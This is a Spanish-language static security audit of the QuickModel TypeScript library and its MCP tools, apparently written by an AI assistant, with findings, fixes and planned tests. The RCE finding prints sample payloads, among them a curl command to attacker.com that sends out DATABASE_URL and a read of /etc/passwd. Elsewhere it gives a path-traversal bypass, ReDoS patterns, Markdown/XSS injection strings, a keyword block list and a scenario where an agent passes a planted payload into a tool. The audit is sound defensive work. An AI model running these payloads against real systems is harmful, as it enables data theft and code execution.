# Auditoría de Seguridad — QuickModel

**Fecha:** 1 de marzo de 2026  
**Auditor:** GitHub Copilot (análisis estático exhaustivo, archivo a archivo)  
**Estado:** Pendiente de arreglo  
**Suite automatizada:** ✅ Pasa (los tests existentes no cubren estos vectores)

---

## Resumen ejecutivo

Se identificaron **15 vulnerabilidades** distribuidas en cuatro niveles de severidad. La base del núcleo de la librería (`QModel`, transformers, population, serialización) tiene una postura de seguridad **sólida y bien implementada**. Los fallos se concentran principalmente en las **herramientas MCP internas** y en casos edge de los servicios de serialización/deserialización.

| Severidad  | Cantidad |
| ---------- | :------: |
| 🔴 CRÍTICA |    1     |
| 🟠 ALTA    |    4     |
| 🟡 MEDIA   |    5     |
| 🟢 BAJA    |    5     |

---

## 🔴 CRÍTICO

---

### CRIT-01 — RCE vía `new Function()` con predicados controlados por el usuario

**Archivos afectados:**

- `src/mcp/tools/public/simulate-rules.tool.ts` (alrededor de L126–133)
- `src/mcp/tools/public/simulate-async-rules.tool.ts` (alrededor de L160–165)
- `src/mcp/tools/public/simulate-validation.tool.ts` (alrededor de L122–128)

**Tipo:** Remote Code Execution (eval implícito)  
**Test que lo cubre:** ❌ Ninguno

#### Descripción

Los tres tools MCP de simulación construyen funciones dinámicas con `new Function()` usando strings de predicado que provienen directamente del cliente MCP, sin ningún sandboxing ni lista de palabras prohibidas:

```typescript
// simulate-validation.tool.ts
// eslint-disable-next-line @typescript-eslint/no-implied-eval
const ruleFn = new Function(
	'value',
	'data',
	`'use strict'; return !!(${rule.predicate});` // ← predicate controlado por el cliente
);
passed = ruleFn(value, data) as boolean;

// simulate-rules.tool.ts
// eslint-disable-next-line @typescript-eslint/no-implied-eval
const func = new Function(
	'value',
	'data',
	`'use strict'; return !!(${predicateStr});` // ← predicateStr del cliente
);
return func(value, capturedData) as boolean;

// simulate-async-rules.tool.ts
// eslint-disable-next-line @typescript-eslint/no-implied-eval
const func = new Function(
	'value',
	'data',
	`'use strict'; return (${predicateStr});` // ← predicateStr del cliente
);
```

El comentario `eslint-disable-next-line @typescript-eslint/no-implied-eval` presente en los tres archivos confirma que el equipo ya era consciente del riesgo en su momento, pero no se implementó la mitigación.

**`'use strict'` NO previene RCE** en Node.js/Bun. Un predicado malicioso puede:

```js
// Ejecutar comandos del sistema operativo:
"process.mainModule.require('child_process').execSync('curl attacker.com?k='+process.env.DATABASE_URL)";

// Leer archivos del sistema:
"require('fs').readFileSync('/etc/passwd','utf8')";

// Matar el proceso:
'process.exit(1)';

// Exfiltrar variables de entorno:
'JSON.stringify(process.env)';
```

#### Escenario de explotación real

1. Un modelo AI (agente) analiza código de un proyecto de terceros
2. Ese código contiene un comentario con un payload malicioso en el predicado
3. El agente invoca `simulate_validation` con ese predicado sin revisarlo
4. El payload se ejecuta en el sistema del usuario con los permisos del proceso MCP

#### Mitigación recomendada

**Opción A (recomendada) — Compilador de predicados restringido:**  
Parsear el predicado como árbol de expresiones y solo permitir operadores booleanos básicos, comparaciones, propiedades y literales. Rechazar todo lo que no sea una expresión pura.

**Opción B — Lista de palabras prohibidas (defensa en profundidad mínima):**

```typescript
const FORBIDDEN = [
	'require',
	'import',
	'process',
	'global',
	'__dirname',
	'__filename',
	'eval',
	'Function',
	'Buffer',
	'fetch',
	'XMLHttpRequest',
	'setTimeout',
	'setInterval',
];

for (const word of FORBIDDEN) {
	if (predicateStr.includes(word)) {
		throw new Error(`Security: Forbidden keyword "${word}" in predicate`);
	}
}
```

**Opción C — Worker thread con timeout (sandboxing real):**  
Ejecutar la función en un `Worker` con `--no-experimental-vm-modules` y matar el worker si supera N ms.

**Tests a escribir (TDD primero):**

```typescript
// tests/security/mcp-simulate-rce.test.ts
it('should reject predicates with require()', async () => { ... });
it('should reject predicates with process.env access', async () => { ... });
it('should reject predicates with process.exit()', async () => { ... });
it('should allow safe boolean predicates', async () => { ... });
```

---

## 🟠 ALTA

---

### HIGH-01 — Path Traversal en `patch-jsdoc` (guardia sin separador de directorio)

**Archivo:** `src/mcp/tools/internal/patch-jsdoc.tool.ts` (~L111–117)  
**Tipo:** Path Traversal (lectura + escritura de archivos .ts)  
**Test que lo cubre:** ❌ Ninguno (`mcp-security.test.ts` cubre otros tools pero no este)

#### Descripción

La guardia de path traversal compara `absPath.startsWith(cwd)` sin añadir el separador de directorio `/` al final de `cwd`:

```typescript
const absPath = resolve(
	args.file_path.startsWith(sep) ? args.file_path : `${cwd}/${args.file_path}`
);
if (!absPath.startsWith(cwd)) {
	// ← BUG: falta + sep al final de cwd
	return { success: false, error: 'Path traversal detected...' };
}
```

**Escenario de bypass (sibling directory attack):**

```
cwd     = /home/user/quickmodel
payload = /home/user/quickmodel-evil/admin-config.ts

absPath.startsWith("/home/user/quickmodel")
// → "/home/user/quickmodel-evil/admin-config.ts".startsWith("/home/user/quickmodel")
// → true  ← guardia bypasseada
```

El tool puede **leer y sobreescribir** cualquier fichero `.ts` en directorios cuya ruta comience con los mismos caracteres que `cwd`.

#### Referencia — implementación correcta en el mismo repo

`src/mcp/tools/internal/scaffold-feature.tool.ts` y `src/mcp/tools/internal/check-project-rules.tool.ts` tienen este problema **correctamente resuelto**:

```typescript
// scaffold-feature.tool.ts — CORRECTO
const safeCwd = cwd.endsWith(sep) ? cwd : cwd + sep;
if (!safeDir.startsWith(safeCwd)) throw new Error('Security Error...');
```

#### Mitigación

```typescript
// patch-jsdoc.tool.ts — CORRECCIÓN
const safeCwd = cwd.endsWith(sep) ? cwd : cwd + sep;
if (!absPath.startsWith(safeCwd)) {
	return { success: false, error: 'Path traversal detected' };
}
```

**Tests a escribir:**

```typescript
it('should block sibling directory attack on patch_jsdoc', async () => {
	const siblingPath = cwd.replace(/\/$/, '') + '-evil/secret.ts';
	// debe devolver { success: false, error: 'Path traversal detected' }
});
```

---

### HIGH-02 — Path Traversal en `manage-proposal` (guardia sin separador)

**Archivo:** `src/mcp/tools/internal/manage-proposal.tool.ts` (~L152)  
**Tipo:** Path Traversal (lectura + escritura de ficheros .md)  
**Test que lo cubre:** ❌ Ninguno

#### Descripción

Misma vulnerabilidad que HIGH-01. El parámetro opcional `tasks_path` permite al cliente MCP especificar la ruta del `TASKS.md`. La guardia tiene el mismo bug de "prefix sin separador":

```typescript
if (!tasksPath.startsWith(cwd)) {
	// ← BUG: falta sep
	return { success: false, error: 'Path traversal detected...' };
}
```

**Operaciones afectadas:**

- `readFileSync(tasksPath, 'utf-8')` — lectura de contenido
- `writeFileSync(tasksPath, newContent, 'utf-8')` — sobreescritura con contenido controlado por el atacante

Un cliente malicioso puede:

1. **Leer** cualquier `.md` del sistema con ruta que sea prefijo de `cwd`
2. **Sobreescribir** esos ficheros con contenido arbitrario (acción `add`)

#### Mitigación

```typescript
const safeCwd = cwd.endsWith(sep) ? cwd : cwd + sep;
if (!tasksPath.startsWith(safeCwd)) { ... }
```

---

### HIGH-03 — Path Traversal en `add-to-sidebar` (sin guardia alguna)

**Archivo:** `src/mcp/tools/internal/add-to-sidebar.tool.ts` (~L118–129)  
**Tipo:** Path Traversal (lectura + escritura de ficheros, sin ninguna restricción)  
**Test que lo cubre:** ❌ Ninguno  
**Nota:** Este es el más grave de los tres path traversals porque no hay absolutamente ninguna guardia.

#### Descripción

El parámetro opcional `config_path` se usa directamente para leer y escribir sin ninguna validación:

```typescript
const configPath =
	args.config_path ??
	resolve(process.cwd(), 'docs-vitepress', '.vitepress', 'config.ts');

// ← NO hay ninguna guardia de path traversal aquí
if (!this._fs.existsSync(configPath)) {
	return error;
}

const content = this._fs.readFileSync(configPath, 'utf-8'); // lectura arbitraria
// ... transformaciones ...
this._fs.writeFileSync(configPath, withEs, 'utf-8'); // escritura arbitraria
```

**Un cliente MCP puede:**

- Leer `/etc/passwd`, `/etc/shadow`, `~/.ssh/id_rsa`, variables de entorno en ficheros `.env`
- Sobreescribir `~/.bashrc`, `~/.profile`, archivos de configuración del sistema
- Sobreescribir el propio `package.json` del proyecto con scripts maliciosos
- Cualquier archivo legible/escribible por el usuario que ejecuta el servidor MCP

#### Mitigación

```typescript
import { resolve, sep } from 'node:path';

const resolvedConfigPath = resolve(configPath);
const safeCwd = process.cwd().endsWith(sep)
	? process.cwd()
	: process.cwd() + sep;

if (!resolvedConfigPath.startsWith(safeCwd)) {
	return {
		success: false,
		error: 'Security: config_path must be within the project directory',
	};
}
```

**Tests a escribir:**

```typescript
it('should block absolute path outside project in add_to_sidebar', () => { ... });
it('should block relative traversal ../../ in add_to_sidebar', () => { ... });
it('should block sibling directory in add_to_sidebar', () => { ... });
```

---

### HIGH-04 — Stack trace expuesto en el fallback del serializer

**Archivo:** `src/core/services/serializer.service.ts` (~L953–958)  
**Tipo:** Information Disclosure (rutas absolutas del sistema en respuestas)  
**Test que lo cubre:** ❌ Ninguno

#### Descripción

El método `serializeValue()` tiene un branch fallback para `Error` que incluye `value.stack`:

```typescript
if (value instanceof Error) {
    const transformer = this.transformers.get(Error) || ...;
    return transformer
        ? transformer.serialize(value)  // ← correcto: ErrorTransformer no expone stack
        : {
            message: value.message,
            stack: value.stack,         // ← BUG: stack trace expuesto en fallback
            name: value.name,
          };
}
```

El `ErrorTransformer` registrado en el constructor es seguro (devuelve solo `"${name}: ${message}"`). El `eslint-disable stack injection` en `error.transformer.ts` incluso documenta que el propósito es **no exponer el stack**.

Sin embargo, el fallback lo expone cuando:

- El `Serializer` se instancia manualmente sin registrar el `ErrorTransformer`
- El mapa de transformers está corrompido o fue sobreescrito

Un stack trace de Node.js/Bun contiene rutas como:

```
at Object.<anonymous> (/home/user/.bun/install/cache/quickmodel@1.x/src/core/...)
at Module._compile (node:internal/modules/cjs/loader:1364:14)
```

Esto revela la estructura interna del servidor, versiones exactas, rutas absolutas del sistema de despliegue.

#### Mitigación

```typescript
// Eliminar stack del fallback — alinear con el comportamiento del ErrorTransformer
return transformer
	? transformer.serialize(value)
	: { message: value.message, name: value.name }; // sin stack
```

---

## 🟡 MEDIA

---

### MED-01 — ReDoS potencial en `RegExpTransformer`

**Archivo:** `src/transformers/regexp.transformer.ts` (~L89 y L143)  
**Tipo:** Regex DoS (denegación de servicio por backtracking exponencial)  
**Test que lo cubre:** ⚠️ Parcial — `regexp-dos.test.ts` y `regexp-redos.test.ts` cubren el límite de longitud pero documentan explícitamente que patrones cortos maliciosos **pasan sin error**

#### Descripción

La defensa actual es un límite de **1000 caracteres** en la longitud del patrón. Esta defensa es **insuficiente**: los patrones de ReDoS más efectivos son muy cortos.

```typescript
// regexp.transformer.ts
const MAX_LENGTH = 1000;
if (typeof value === 'string' && value.length > MAX_LENGTH) { throw ... }
// ↑ Límite de longitud — NO defiende contra ReDoS
return new RegExp(value.source, value.flags || '');
```

Patrones exploitables que tienen menos de 20 caracteres:

- `(a+)+` — exponencial al evaluar `"aaaaaaaaaaaaaab"`
- `([a-zA-Z]+)*` — exponencial
- `(a|aa)+` — exponencial
- `^(a|a?)+$` — exponencial

El propio test `regexp-redos.test.ts` documenta que `(a+)+` **pasa** la defensa actual.

Adicionalmente, en formato `{ source, flags }` los flags no tienen whitelist (ver LOW-03).

#### Mitigación recomendada

1. Añadir detección de estructura `(X+)+`, `(X|Y)+` con anidamiento:

```typescript
const REDOS_PATTERNS = [
	/\(.*\+\).*\+/, // (X+)+
	/\(.*\|.*\).*\+/, // (X|Y)+
	/\(\?\:.*\|.*\).*[\*\+]/, // (?:X|Y)*
];
for (const redos of REDOS_PATTERNS) {
	if (redos.test(source))
		throw new QModelError('Potentially unsafe regex pattern');
}
```

2. O ejecutar la compilación del regex con un timeout usando `worker_threads`.

---

### MED-02 — `JSON.parse` sin validación de tipo en `deserializeFromJson`

**Archivo:** `src/core/services/deserializer.service.ts` (~L259)  
**Tipo:** Error silencioso / comportamiento indefinido con inputs no-objeto  
**Test que lo cubre:** ❌ Ninguno

#### Descripción

```typescript
deserializeFromJson<TResult = TModel>(
    json: string,
    modelClass: new (data: Record<string, unknown>) => TResult
): TResult {
    const data = JSON.parse(json) as Record<string, unknown>;
    // ← El cast es solo TypeScript en tiempo de compilación
    return this.deserialize(data, modelClass);
}
```

`JSON.parse` puede devolver cualquier tipo JSON válido. El cast `as Record<string, unknown>` es ignorado en runtime:

| Input JSON   | `typeof data` en runtime | Resultado en `deserialize()`                                               |
| ------------ | ------------------------ | -------------------------------------------------------------------------- |
| `"null"`     | `null`                   | `TypeError: Cannot convert undefined or null to object` en `Object.keys()` |
| `"42"`       | `number`                 | Comportamiento indefinido — campos del modelo no inicializados             |
| `"[1,2,3]"`  | `Array`                  | Comportamiento indefinido — keys son `"0"`, `"1"`, `"2"`                   |
| `'"string"'` | `string`                 | Comportamiento indefinido                                                  |

El error no es un `QModelError` controlado sino un `TypeError` nativo que puede exponer información del runtime.

#### Mitigación

```typescript
deserializeFromJson<TResult = TModel>(
    json: string,
    modelClass: new (data: Record<string, unknown>) => TResult
): TResult {
    const raw: unknown = JSON.parse(json);
    if (raw === null || typeof raw !== 'object' || Array.isArray(raw)) {
        throw new QModelError(
            `deserializeFromJson: Expected a JSON object, got ${
                raw === null ? 'null' : Array.isArray(raw) ? 'array' : typeof raw
            }`
        );
    }
    return this.deserialize(raw as Record<string, unknown>, modelClass);
}
```

---

### MED-03 — Inyección de contenido en ficheros Markdown

**Archivos:**

- `src/mcp/tools/internal/create-guide-page.tool.ts` (~L185)
- `src/mcp/tools/internal/manage-proposal.tool.ts` (~L237)

**Tipo:** Content injection / sanitización incompleta  
**Test que lo cubre:** ❌ Ninguno

#### Descripción

Los campos `title`, `description`, `impact`, `effort` se insertan mediante concatenación directa en ficheros `.md` sin ninguna sanitización:

```typescript
// manage-proposal.tool.ts
const newProposal =
    `### Propuesta ${letter} — ${args.title}\n\n` +   // ← title sin sanear
    `**Impacto:** ${impact}\n` +
    `${args.description}\n`;                            // ← description sin sanear

// create-guide-page.tool.ts
private _buildEnPage(titleText: string, descText?: string): string {
    const desc = descText ? `\n> ${descText}\n` : '';
    return `# ${titleText}\n` + desc + ...;            // ← titleText sin sanear
}
```

Un `title` malicioso puede:

- **Falsificar entradas en TASKS.md:**  
  `"Real Title\n\n### Propuesta Z — Entrada falsa\n\n**Prioridad:** 🔴 Alta\n\n"`
- **Inyectar directivas VitePress en documentación publicada:**  
  `"Title\n\n:::danger Advertencia crítica\nContenido falso\n:::"`
- **Inyectar `<script>` si el renderer no escapa HTML:**  
  `"Title<script>alert('xss')</script>"`

#### Mitigación

```typescript
// Validar que title no contiene saltos de línea ni caracteres estructurales Markdown
const UNSAFE_CONTENT = /[\n\r#`*_<>:]/;
if (UNSAFE_CONTENT.test(args.title)) {
	return { success: false, error: 'title contains unsafe characters' };
}
// O escapar:
const safeTitle = args.title
	.replace(/[\n\r]/g, ' ')
	.replace(/[#`*_<>]/g, '\\$&');
```

---

### MED-04 — Límites débiles en modelo dinámico de tools MCP

**Archivos:**

- `src/mcp/tools/public/simulate-transformation.tool.ts` (~L65)
- `src/mcp/tools/public/roundtrip.tool.ts` (~L80)

**Tipo:** DoS por consumo de memoria  
**Test que lo cubre:** ❌ Ninguno

#### Descripción

Ambos tools crean un `DynamicModel` con `@Quick({})` (parámetros por defecto del sistema) e hidratan con datos arbitrarios del cliente:

```typescript
@Quick({})
class DynamicModel extends QModel<any> {
	[key: string]: any;
}
const instance = DynamicModel.create(args.data); // ← args.data del cliente sin límites ajustados
```

Los defaults del sistema son:

- `maxArrayLength: 5_000_000` (5 millones de elementos)
- `maxObjectProperties: 50_000`
- `maxRecursionDepth: 50`

Un payload `{ "items": [<5M objetos complejos>] }` puede consumir **varios GB de RAM** por request. En un servidor MCP que maneja múltiples requests concurrentes, esto es un vector de DoS efectivo.

#### Mitigación

Usar límites más restrictivos en el modelo dinámico de tools:

```typescript
@Quick({
    maxArrayLength: 1_000,
    maxObjectProperties: 500,
    maxRecursionDepth: 10,
})
class DynamicModel extends QModel<IRecord> { ... }
```

---

### MED-05 — Proceso `grep` sin timeout en `QSearchDocsTool`

**Archivo:** `src/mcp/tools/public/search-docs.tool.ts` (~L50–66)  
**Tipo:** DoS por proceso colgado (ausencia de límite de tiempo)  
**Test que lo cubre:** ❌ Ninguno para el timeout

#### Descripción

```typescript
const child = spawn('grep', grepArgs);
// ...
await new Promise((resolve) => {
	child.on('close', resolve); // ← espera indefinidamente sin timeout
});
```

No hay `AbortSignal`, `setTimeout` ni `child.kill()` tras N milisegundos. Un query que genere output masivo antes de alcanzar el slice(0,20), o que explore un directorio muy grande, puede mantener el servidor MCP bloqueado en esa Promise indefinidamente.

Nota positiva: el flag injection via `--help` **sí está mitigado** correctamente — el código usa `-e` antes del query y el test en `advanced-vectors.test.ts` lo verifica.

La longitud del query tampoco tiene límite en el schema Zod (`z.string()` sin `.max()`).

#### Mitigación

```typescript
// Añadir timeout de 30 segundos
const child = spawn('grep', grepArgs);
const timeoutId = setTimeout(() => {
    child.kill('SIGTERM');
    reject(new Error('Search timed out'));
}, 30_000);

await new Promise<void>((resolve, reject) => {
    child.on('close', () => { clearTimeout(timeoutId); resolve(); });
    child.on('error', (err) => { clearTimeout(timeoutId); reject(err); });
});

// Y limitar el query en el schema Zod:
query: z.string().min(1).max(200),
```

---

## 🟢 BAJA

---

### LOW-01 — `context.value` almacena el valor raw en `QModelError`

**Archivo:** `src/core/errors/quickmodel.error.ts` (~L33)  
**Tipo:** Exposición potencial de información sensible en logs

El campo `context.value` puede contener contraseñas, tokens, PII completos sin truncamiento ni redacción. Si el error llega a sistemas de observabilidad o logs de producción, los datos sensibles se exponen.

**Mitigación:** Truncar `context.value` a N caracteres para strings, o eliminar el campo en `process.env.NODE_ENV === 'production'`.

---

### LOW-02 — Sin timeout en `spawnCommand` (utils MCP)

**Archivo:** `src/mcp/tools/internal/utils.ts` (~L30)  
**Tipo:** DoS por proceso hijo bloqueado

El límite de buffer (10MB) es correcto y funciona. Falta un límite de **tiempo**: si el proceso hijo se bloquea esperando input o entra en un bucle, el servidor MCP queda colgado indefinidamente.

**Mitigación:**

```typescript
const timer = setTimeout(() => {
	proc.kill('SIGTERM');
	reject(new Error('Command timed out'));
}, 120_000);
proc.on('close', (code) => {
	clearTimeout(timer);
	resolve(code);
});
```

---

### LOW-03 — Flags de RegExp sin whitelist en formato objeto

**Archivo:** `src/transformers/regexp.transformer.ts` (~L143)  
**Tipo:** Validación incompleta (falla silenciosa / error de VM expuesto)

En formato string `/pattern/flags`, los flags están restringidos implícitamente por la regex `/^\/(.+)\/([gimsuy]*)$/`. En formato objeto `{ source, flags }`, los flags **no se validan**:

```typescript
return new RegExp(value.source, value.flags || '');
// Flags inválidos ("xyz") lanzan SyntaxError que incluye mensaje interno del motor JS
```

Además, la whitelist del formato string no incluye los flags modernos `d` (índices) y `v` (unicode sets) — un input `/pattern/d` se trata como string plano en lugar de regex.

**Mitigación:**

```typescript
const VALID_FLAGS = /^[gimsuyDv]*$/; // incluir d y v
if (!VALID_FLAGS.test(value.flags || '')) {
	throw new QModelError(`Invalid RegExp flags: "${value.flags}"`);
}
```

---

### LOW-04 — Sin límite de longitud en títulos de `create-guide-page`

**Archivo:** `src/mcp/tools/internal/create-guide-page.tool.ts`  
**Tipo:** Validación incompleta

El schema Zod usa `z.string()` sin `.max()` para `title_en`, `title_es`, `description_en`, `description_es`. Un título de decenas de miles de caracteres se inserta íntegro en el Markdown generado.

**Mitigación:** Añadir `.max(200)` y `.max(500)` respectivamente en el schema Zod.

---

### LOW-05 — Objetos `Proxy` sin defensa explícita en el serializer

**Archivo:** `src/core/services/serializer.service.ts` (~L935)  
**Tipo:** Efectos secundarios no controlados durante serialización

El path de objetos genéricos no reconocidos hace `Object.keys(value)` y accede a propiedades directamente. Si `value` es un `Proxy` con getters con efectos secundarios, esos efectos se ejecutan silenciosamente durante `serialize()` (llamadas a red, escritura a disco, mutación de estado).

En la práctica requiere que el código de usuario pase un Proxy a un modelo, lo cual es un escenario de baja probabilidad. Sin embargo, no hay defensa explícita ni documentación del comportamiento.

---

## Aspectos de seguridad positivos (no tocar)

El núcleo de la librería tiene una postura de seguridad excelente. Estos mecanismos funcionan correctamente y deben preservarse:

| Mecanismo                                                                     | Archivo                                                   | Estado                |
| ----------------------------------------------------------------------------- | --------------------------------------------------------- | --------------------- |
| Prototype Pollution bloqueada (`__proto__`, `constructor`, `prototype`, etc.) | `security-inspector.service.ts`                           | ✅ Robusto            |
| Method shadowing protection                                                   | `security-inspector.service.ts`                           | ✅ Robusto            |
| Límites de tamaño (50K props, 5M array, configurable)                         | `object-size-validator.service.ts`                        | ✅ Correcto           |
| Límites de recursión (depth 50 pop., depth 512 serializer)                    | `recursion-guard.service.ts`                              | ✅ Correcto           |
| Detección de referencias circulares                                           | `serializer.service.ts`, `population.service.ts`          | ✅ WeakSet            |
| `ErrorTransformer` bloquea stack injection                                    | `error.transformer.ts`                                    | ✅ Documentado        |
| `safeStringify` con manejo de circulares                                      | `transform-helpers.ts`                                    | ✅ Correcto           |
| `spawnCommand` usa `spawn()` no `exec()` + límite 10MB                        | `mcp/tools/internal/utils.ts`                             | ✅ Correcto           |
| Path traversal con sep correcto                                               | `scaffold-feature.tool.ts`, `check-project-rules.tool.ts` | ✅ Modelo a seguir    |
| Flag injection en grep bloqueado con `-e`                                     | `search-docs.tool.ts`                                     | ✅ Correcto           |
| Whitelist de constructores en `hydrateOptions`                                | `simulate-transformation.tool.ts`                         | ✅ Correcto           |
| Dot-notation protection contra prototype keys                                 | `dot-notation-handler.service.ts`                         | ✅ Guardias presentes |

---

## Plan de trabajo sugerido

### Fase 1 — Crítico + Altos (hacer primero, TDD)

1. **CRIT-01:** Implementar sanitizador de predicados para los 3 tools de simulación
2. **HIGH-01 + HIGH-02:** Añadir `+ sep` en las guardias de `patch-jsdoc` y `manage-proposal`
3. **HIGH-03:** Añadir guardia de path traversal completa en `add-to-sidebar`
4. **HIGH-04:** Eliminar `stack` del fallback en `serializer.service.ts`

### Fase 2 — Medios

5. **MED-02:** Guard de tipo tras `JSON.parse` en `deserializeFromJson`
6. **MED-03:** Sanitizar `title`, `description` antes de insertar en Markdown
7. **MED-04:** Limitar parámetros de `@Quick({})` en modelo dinámico de tools
8. **MED-05:** Añadir timeout a `spawn` de grep + límite de longitud del query
9. **MED-01:** Analizar si implementar detección básica de patrones ReDoS

### Fase 3 — Bajos

10. **LOW-01:** Truncar `context.value` en `QModelError`
11. **LOW-02:** Timeout en `spawnCommand`
12. **LOW-03:** Whitelist de flags en formato objeto RegExp + añadir `d` y `v`
13. **LOW-04:** `.max()` en schema Zod de títulos
14. **LOW-05:** Documentar comportamiento con Proxy (o añadir `Proxy` check)

### Para cada arreglo: escribir el test primero (TDD)

Los tests de seguridad van en `tests/security/`. El archivo `mcp-security.test.ts` es el lugar natural para los path traversal de tools MCP. Para RCE, crear `tests/security/mcp-simulate-rce.test.ts`.

---

_Documento generado el 1 de marzo de 2026 — auditoría estática exhaustiva archivo a archivo de todo `src/`_
